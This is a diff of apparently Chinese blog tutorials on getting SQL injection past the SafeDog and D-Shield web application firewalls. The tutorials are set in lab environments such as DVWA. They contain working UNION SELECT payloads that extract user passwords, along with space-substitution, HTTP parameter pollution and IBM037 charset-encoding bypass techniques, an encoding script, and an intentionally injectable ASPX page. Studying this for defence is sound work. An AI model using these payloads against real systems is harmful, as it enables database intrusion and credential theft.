+<h3 id="函数分隔符绕过"><a href="#函数分隔符绕过" class="headerlink" title="函数分隔符绕过"></a>函数分隔符绕过</h3><h4 id="绕过原理-1"><a href="#绕过原理-1" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：函数与括号之间插入分隔符可以正常执行</strong></p>
 <p>对基于正则表达式的WAF，我们猜测安全工程师写WAF规则时，可能不知道函数名与左括号之间可以存在特殊字符，或者遗漏可以存在特殊字符。例如匹配函数”concat()”的规则写法，“concat(”或者”concat\s*(”，就没有考虑到一些特殊字符。相应的绕过方法，在特殊位置引入特殊的分隔符，逐个测试。这些特殊分隔符发现也是通过Fuzz出来的。</p>
 <p><strong>绕过技巧</strong>：</p>
 <ul>
@@ -2054,7 +2059,7 @@
 <p><strong>数据包构造</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 83</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union select null,concat_ws(char%0a%0d(32,58,32),user,password) from users #</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/10/16/lhWsHSvDfrwjN2Q.png" alt="image-20211016103625239"></p>
-<h2 id="协议未覆盖绕过"><a href="#协议未覆盖绕过" class="headerlink" title="协议未覆盖绕过"></a>协议未覆盖绕过</h2><h3 id="绕过原理-2"><a href="#绕过原理-2" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>HTTP协议兼容性：HTTP Body多样性</strong></p>
+<h3 id="协议未覆盖绕过"><a href="#协议未覆盖绕过" class="headerlink" title="协议未覆盖绕过"></a>协议未覆盖绕过</h3><h4 id="绕过原理-2"><a href="#绕过原理-2" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>HTTP协议兼容性：HTTP Body多样性</strong></p>
 <p>在 http 头里的 Content-Type 提交表单支持四种协议：</p>
 <ul>
 <li>application/x-www-form-urlencoded  -编码模式</li>
@@ -2072,7 +2077,7 @@
 <p><strong>数据包构造</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Length: 218</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union select null,concat_ws</span><br><span class="line"></span><br><span class="line">(char(32,58,32),user,password) </span><br><span class="line"></span><br><span class="line">from users #</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/10/16/iybr6tfZzQsVJnO.png" alt="image-20211016111037975"></p>
-<h2 id="多行注释符替换绕过"><a href="#多行注释符替换绕过" class="headerlink" title="多行注释符替换绕过"></a>多行注释符替换绕过</h2><h3 id="绕过原理-3"><a href="#绕过原理-3" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>规则缺陷/特性：数据库空格可使用其它字符替代</strong></p>
+<h3 id="多行注释符替换绕过"><a href="#多行注释符替换绕过" class="headerlink" title="多行注释符替换绕过"></a>多行注释符替换绕过</h3><h4 id="绕过原理-3"><a href="#绕过原理-3" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：数据库空格可使用其它字符替代</strong></p>
 <p>因为注释符#、— 都是把后面的语句全部注释掉了，而多行注释/**/则是注释指定部分，需要一前一后闭合，所以在传参那里几乎不做注释语句用，而是用于过滤空格等bypass。</p>
 <p>在进行SQL语句查询的时候可以利用注释符来替代语法中的空格，例如：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [dbo].[<span class="keyword">User</span>] <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
@@ -2099,6 +2104,68 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+union/*//*/select 1,concat_ws(char(32,58,32),user,password) from/*//*/users+%23&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/10/16/ZkhTPXifCQYWKIr.png" alt="image-20211016150953965"></p>
 <p>​    </p>
+<h2 id="Bypass安全狗SQLServer注入"><a href="#Bypass安全狗SQLServer注入" class="headerlink" title="Bypass安全狗SQLServer注入"></a>Bypass安全狗SQLServer注入</h2><h3 id="SQLServer特性"><a href="#SQLServer特性" class="headerlink" title="SQLServer特性"></a>SQLServer特性</h3><p><strong>空格可以由其它字符替代</strong></p>
+<blockquote>
+<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,db_name()<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
+</blockquote>
+<ul>
+<li><p>位置①</p>
+<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用数学运算符以及数据类型：news_id=1.0，news_id=1e0，news_id=1-1</li>
+</ul>
+</li>
+<li><p>位置②</p>
+<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可以利用加号+替换空格：union+select</li>
+</ul>
+</li>
+<li><p>位置③</p>
+<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用数学运算符：+、-、~、.    （注：其中-、~、.号必须是select查询的第一个字段的数据类型为数字型才能使用）</li>
+<li>可以利用小括号()替换空格：select(1),2,db_name()</li>
+</ul>
+</li>
+<li><p>位置④</p>
+<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
+</ul>
+</li>
+<li><p>位置⑤</p>
+<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
+<li>可以利用点号.替换空格：from.users</li>
+<li>可以利用中括号[]替换空格：from[users]</li>
+</ul>
+</li>
+</ul>
+<h3 id="实验靶场-1"><a href="#实验靶场-1" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>数据库：SQL Server 2008R2</p>
+<p>Web服务器： IIS7.5 CN</p>
+<p>WAF：网站安全狗（IIS版）v4.0.3215</p>
+<p>靶场源码如下：index.aspx</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Data&quot; %&gt;</span><br><span class="line">&lt;%@ Import namespace=&quot;System.Data.SqlClient&quot;  %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;script runat=&quot;server&quot;&gt;</span><br><span class="line">    private DataSet resSet=new DataSet();</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        String strconn = &quot;server=.;database=test;uid=sa;pwd=admin&quot;;</span><br><span class="line">		string id = Request.Params[&quot;id&quot;];</span><br><span class="line">        string sql = string.Format(&quot;select * from newss where id=&#123;0&#125;&quot;, id);</span><br><span class="line">        SqlConnection connection=new SqlConnection(strconn);</span><br><span class="line">        connection.Open();</span><br><span class="line">        SqlDataAdapter dataAdapter = new SqlDataAdapter(sql, connection);</span><br><span class="line">        dataAdapter.Fill(resSet);</span><br><span class="line">        DgData.DataSource = resSet.Tables[0];</span><br><span class="line">        DgData.DataBind();</span><br><span class="line">        Response.Write(&quot;执行语句:&lt;br&gt;&quot;+sql);</span><br><span class="line">        Response.Write(&quot;&lt;br&gt;结果为:&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head runat=&quot;server&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;SQLServer注入测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;asp:DataGrid ID=&quot;DgData&quot; runat=&quot;server&quot; BackColor=&quot;White&quot; BorderColor=&quot;#3366CC&quot; </span><br><span class="line">            BorderStyle=&quot;None&quot; BorderWidth=&quot;1px&quot; CellPadding=&quot;4&quot; </span><br><span class="line">                HeaderStyle-CssClass=&quot;head&quot; Width=&quot;203px&quot;&gt;</span><br><span class="line">            &lt;FooterStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">            &lt;SelectedItemStyle BackColor=&quot;#009999&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCFF99&quot; /&gt;</span><br><span class="line">            &lt;PagerStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; HorizontalAlign=&quot;Left&quot; </span><br><span class="line">                Mode=&quot;NumericPages&quot; /&gt;</span><br><span class="line">            &lt;ItemStyle BackColor=&quot;White&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">&lt;HeaderStyle CssClass=&quot;head&quot; BackColor=&quot;#003399&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCCCFF&quot;&gt;&lt;/HeaderStyle&gt;</span><br><span class="line">        &lt;/asp:DataGrid&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="HPP分割参数绕过"><a href="#HPP分割参数绕过" class="headerlink" title="HPP分割参数绕过"></a>HPP分割参数绕过</h3><h4 id="绕过原理-4"><a href="#绕过原理-4" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：HPP参数污染</strong></p>
+<p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p>
+<p>在ASPX中，有一个比较特殊的HPP特性，当GET/POST/COOKIE同时提交的参数id，服务端接收参数id的顺序GET,POST,COOKIE，中间通过逗号链接，于是就有了这个idea。</p>
+<p>UNION、SELECT、FROM 三个关键字分别放在GET/POST/COOKIE的位置，通过ASPX的这个特性连起来，堪称完美的一个姿势，压根不好防。</p>
+<p>但姿势利用太过于局限： 使用Request.Params[“id”]来获取参数,G-P-C获取到参数拼接起来，仅仅作为Bypass分享一种思路而已。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nxzhYKqy6N2ked4h26t90woffPY1UxcJt6cQhMdzlicibZJNte04WjFeJf5cEkibVfGGK3fgXr9h5UA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p>
+<p><strong>绕过技巧</strong>：</p>
+<ul>
+<li>GET型请求转POST型</li>
+<li>参数传递的顺序：GET-&gt;POST-&gt;COOKIE</li>
+<li>使用多行注释符/**/来闭合分割参数的逗号</li>
+</ul>
+<p><img src="https://i.loli.net/2021/10/27/SxH8TCOv2LsNBgQ.png" alt="image-20211027201228560"></p>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -4680,16 +4747,50 @@
   <entry>
     <title>WAF-Bypass之SQL注入绕过D盾</title>
     <url>/post/f020bf7f.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>数据库：SQL Server 2008R2</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="SQLServer特性"><a href="#SQLServer特性" class="headerlink" title="SQLServer特性"></a>SQLServer特性</h3><p><strong>空格可以由其它字符替代</strong></p>
+<blockquote>
+<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,db_name()<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
+</blockquote>
+<ul>
+<li>位置①<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用数学运算符以及数据类型：news_id=1.0，news_id=1e0，news_id=1-1</li>
+</ul>
+</li>
+<li>位置②<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可以利用加号+替换空格：union+select</li>
+</ul>
+</li>
+<li>位置③<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用数学运算符：+、-、~、.    （注：其中-、~、.号必须是select查询的第一个字段的数据类型为数字型才能使用）</li>
+<li>可以利用小括号()替换空格：select(1),2,db_name()</li>
+</ul>
+</li>
+<li>位置④<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
+</ul>
+</li>
+<li>位置⑤<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
+<li>可以利用点号.替换空格：from.users</li>
+<li>可以利用中括号[]替换空格：from[users]</li>
+</ul>
+</li>
+</ul>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>数据库：SQL Server 2008R2</p>
 <p>Web服务器： IIS7.5 CN</p>
 <p>WAF：D盾_v2.1.6.1[测试版]</p>
 <p>靶场源码如下：index.aspx</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="operator">%</span>@ Page <span class="keyword">Language</span><span class="operator">=</span>&quot;C#&quot; AutoEventWireup<span class="operator">=</span>&quot;true&quot; <span class="operator">%</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">%</span>@ Import Namespace<span class="operator">=</span>&quot;System.Data&quot; <span class="operator">%</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">%</span>@ Import namespace<span class="operator">=</span>&quot;System.Data.SqlClient&quot;  <span class="operator">%</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE html<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>script runat<span class="operator">=</span>&quot;server&quot;<span class="operator">&gt;</span></span><br><span class="line">    private DataSet resSet<span class="operator">=</span><span class="keyword">new</span> DataSet();</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        String strconn <span class="operator">=</span> &quot;server=.;database=test;uid=sa;pwd=admin&quot;;</span><br><span class="line">		string id <span class="operator">=</span> Request.Params[&quot;id&quot;];</span><br><span class="line">        string <span class="keyword">sql</span> <span class="operator">=</span> string.Format(&quot;select * from newss where id=&#123;0&#125;&quot;, id);</span><br><span class="line">        SqlConnection connection<span class="operator">=</span><span class="keyword">new</span> SqlConnection(strconn);</span><br><span class="line">        connection.Open();</span><br><span class="line">        SqlDataAdapter dataAdapter <span class="operator">=</span> <span class="keyword">new</span> SqlDataAdapter(<span class="keyword">sql</span>, connection);</span><br><span class="line">        dataAdapter.Fill(resSet);</span><br><span class="line">        DgData.DataSource <span class="operator">=</span> resSet.Tables[<span class="number">0</span>];</span><br><span class="line">        DgData.DataBind();</span><br><span class="line">        Response.Write(&quot;执行语句:&lt;br&gt;&quot;<span class="operator">+</span><span class="keyword">sql</span>);</span><br><span class="line">        Response.Write(&quot;&lt;br&gt;结果为:&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>html xmlns<span class="operator">=</span>&quot;http://www.w3.org/1999/xhtml&quot;<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>head runat<span class="operator">=</span>&quot;server&quot;<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>meta http<span class="operator">-</span>equiv<span class="operator">=</span>&quot;Content-Type&quot; content<span class="operator">=</span>&quot;text/html; charset=utf-8&quot;<span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span>title<span class="operator">&gt;</span>SQLServer注入测试<span class="operator">&lt;</span><span class="operator">/</span>title<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>head<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>body<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span>form id<span class="operator">=</span>&quot;form1&quot; runat<span class="operator">=</span>&quot;server&quot;<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span>div<span class="operator">&gt;</span></span><br><span class="line">    </span><br><span class="line">        <span class="operator">&lt;</span>asp:DataGrid ID<span class="operator">=</span>&quot;DgData&quot; runat<span class="operator">=</span>&quot;server&quot; BackColor<span class="operator">=</span>&quot;White&quot; BorderColor<span class="operator">=</span>&quot;#3366CC&quot; </span><br><span class="line">            BorderStyle<span class="operator">=</span>&quot;None&quot; BorderWidth<span class="operator">=</span>&quot;1px&quot; CellPadding<span class="operator">=</span>&quot;4&quot; </span><br><span class="line">                HeaderStyle<span class="operator">-</span>CssClass<span class="operator">=</span>&quot;head&quot; Width<span class="operator">=</span>&quot;203px&quot;<span class="operator">&gt;</span></span><br><span class="line">            <span class="operator">&lt;</span>FooterStyle BackColor<span class="operator">=</span>&quot;#99CCCC&quot; ForeColor<span class="operator">=</span>&quot;#003399&quot; <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">            <span class="operator">&lt;</span>SelectedItemStyle BackColor<span class="operator">=</span>&quot;#009999&quot; Font<span class="operator">-</span>Bold<span class="operator">=</span>&quot;True&quot; ForeColor<span class="operator">=</span>&quot;#CCFF99&quot; <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">            <span class="operator">&lt;</span>PagerStyle BackColor<span class="operator">=</span>&quot;#99CCCC&quot; ForeColor<span class="operator">=</span>&quot;#003399&quot; HorizontalAlign<span class="operator">=</span>&quot;Left&quot; </span><br><span class="line">                Mode<span class="operator">=</span>&quot;NumericPages&quot; <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">            <span class="operator">&lt;</span>ItemStyle BackColor<span class="operator">=</span>&quot;White&quot; ForeColor<span class="operator">=</span>&quot;#003399&quot; <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>HeaderStyle CssClass<span class="operator">=</span>&quot;head&quot; BackColor<span class="operator">=</span>&quot;#003399&quot; Font<span class="operator">-</span>Bold<span class="operator">=</span>&quot;True&quot; ForeColor<span class="operator">=</span>&quot;#CCCCFF&quot;<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>HeaderStyle<span class="operator">&gt;</span></span><br><span class="line">        <span class="operator">&lt;</span><span class="operator">/</span>asp:DataGrid<span class="operator">&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="operator">&lt;</span><span class="operator">/</span>div<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span><span class="operator">/</span>form<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>body<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>html<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>注：</p>
-<p>D盾的过滤规则限制地非常严格，但凡有个等于号都会拦截，好在D盾也仅支持IIS服务器。</p>
-<p>网上的以前版本的绕过方法在最新版统统不管用（如Cookie传参绕过、报错注入绕过、html实体编码绕过），我这里暂时只发现了一种绕过手法，而且这种方法在之后的版本也很有可能失效，所以仅供参考。</p>
-</blockquote>
 <h2 id="字符集编码绕过"><a href="#字符集编码绕过" class="headerlink" title="字符集编码绕过"></a>字符集编码绕过</h2><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>HTTP协议兼容性：HTTP Charset的多样性</strong></p>
 <p>Content-Type头中使用charset定义字符集的应用场景不只有在responses中，request中同样可以使用。</p>
 <p>常见的服务器与可见编码如下所示：</p>
@@ -4734,7 +4835,7 @@
 <h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>我们使用如下脚本来进行编码转换：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">params = sys.argv[<span class="number">1</span>]</span><br><span class="line">charset= sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">paramEncode</span>(<span class="params">params=<span class="string">&quot;id=1&quot;</span>, charset=<span class="string">&quot;IBM037&quot;</span>, encodeEqualSign=<span class="literal">False</span>, encodeAmpersand=<span class="literal">False</span>, urldecodeInput=<span class="literal">True</span>, urlencodeOutput=<span class="literal">True</span></span>):</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    equalSign = <span class="string">&quot;=&quot;</span></span><br><span class="line">    ampersand = <span class="string">&quot;&amp;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> encodeEqualSign:</span><br><span class="line">       equalSign = equalSign.encode(charset)</span><br><span class="line">    <span class="keyword">if</span> encodeAmpersand:</span><br><span class="line">       ampersand = ampersand.encode(charset)</span><br><span class="line">    params_list = params.split(<span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> param_pair <span class="keyword">in</span> params_list:</span><br><span class="line">       param, value = param_pair.split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">       <span class="keyword">if</span> urldecodeInput:</span><br><span class="line">          param = urllib.unquote(param).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">          value = urllib.unquote(value).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">       param = param.encode(charset)</span><br><span class="line">       value = value.encode(charset)</span><br><span class="line">       <span class="keyword">if</span> urlencodeOutput:</span><br><span class="line">          param = urllib.quote_plus(param)</span><br><span class="line">          value = urllib.quote_plus(value)</span><br><span class="line">       <span class="keyword">if</span> result:</span><br><span class="line">          result += ampersand</span><br><span class="line">       result += param + equalSign + value</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(paramEncode(params,charset))</span><br></pre></td></tr></table></figure>
 <p>这里我们使用IBM037编码进行测试。</p>
-<p>首先需要改变一下BurpSuite的字体类型</p>
+<p>中文版的BurpSuite需要改变一下BurpSuite的字体类型</p>
 <p><img src="https://i.loli.net/2021/10/25/DIogze9mCHcZJVu.png" alt="image-20211025173724964"></p>
 <p>然后使用BurpSuite抓包，并发送到Repeater</p>
 <p><img src="https://i.loli.net/2021/10/25/y6D89xcoERK3GJd.png" alt="image-20211025173902801"></p>
@@ -4751,6 +4852,64 @@
 <p>接下来就是进行SQL注入了</p>
 <p><img src="https://i.loli.net/2021/10/25/F3gozrx4LhcKkYa.png" alt="image-20211025174846914"></p>
 <p>成功绕过D盾WAF</p>
+<h2 id="D盾清洗数据缺陷-多个规则特性组合绕过"><a href="#D盾清洗数据缺陷-多个规则特性组合绕过" class="headerlink" title="D盾清洗数据缺陷+多个规则特性组合绕过"></a>D盾清洗数据缺陷+多个规则特性组合绕过</h2><h3 id="绕过原理-1"><a href="#绕过原理-1" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>规则缺陷/特性：利用D盾清洗数据的特性</strong></p>
+<p>WAF内置多种解码器，经过多次解码以后可能导致绕过。</p>
+<p>当攻击者提交的参数值中存在大量干扰数据时，如大量空格、TAB、换行、%0c、注释等，WAF需要对其进行清洗（为提升性能和降低规则复杂性），筛选出真实的攻击数据进行检测，但是，如果清洗方式不正确，会导致真正的攻击部分被清洗，然后拿去检测的是不含有攻击向量的数据，从而被Bypass。</p>
+<p><strong>规则缺陷/特性：数据库空格可使用其它字符替代</strong></p>
+<p>替代字符可查看SQLServer特性。</p>
+<p><strong>规则缺陷/特性：%00时会被认为读取已结束</strong></p>
+<p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留。</p>
+<p><strong>规则缺陷/特性：HPP参数污染</strong></p>
+<p>同时提交参数id，会接收所有参数，通过逗号分隔。</p>
+<h3 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>抓包，并更改请求方法</p>
+<p><img src="https://i.loli.net/2021/10/28/XqhiFpjxySWu9ne.png" alt="image-20211028161329759"></p>
+<p><strong>测试D盾清洗数据的特性：</strong></p>
+<p>D盾为了防御XSS攻击会对提交的特殊字符进行HTML实体编码，例如提交的数据为<code>&lt;script&gt;</code></p>
+<p><img src="https://i.loli.net/2021/10/28/PbwldozU5JFeq48.png" alt="image-20211028162308251"></p>
+<p>那么假如我们将提交一个已经实体化编码的数据呢？</p>
+<p><img src="https://i.loli.net/2021/10/28/ckNFHZIj7toC2v6.png" alt="image-20211028163222933"></p>
+<p>这里并没有将<code>&amp;gt;</code>进行解码，而是将<code>&amp;</code>符进行编码</p>
+<p><img src="https://i.loli.net/2021/10/28/u5BcRUfAFNCiHDj.png" alt="image-20211028164318800"></p>
+<p>我们可以利用这个特性，使用这串字符去绕过某些多个关键字匹配的规则，如：union…select、order…by、/*…*/、’…’ 等</p>
+<p><img src="https://i.loli.net/2021/10/28/IQPAsSnBR1Tv3Xk.png" alt="image-20211028171853112"></p>
+<p><strong>绕过 and 1=1</strong></p>
+<p>注：1.e可以代替空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1.eand/*%26%67%74%3b*/1=1</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/28/x1AfMFlmO6N8UYE.png" alt="image-20211028173512915"></p>
+<p><strong>绕过 order by</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order/*%26%67%74%3b*/by 2</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/28/dqJ1A5OMTsV8Cfj.png" alt="image-20211028174034111"></p>
+<p><strong>绕过 union select</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1.eunion--%26%67%74%3b%0aselect NULL,NULL,NULL</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/28/LItXix9URDsbMke.png" alt></p>
+<p><strong>绕过 from</strong></p>
+<p>from的绕过这就是一个技术活了，这里是利用到了HPP以及%00截断来进行绕过</p>
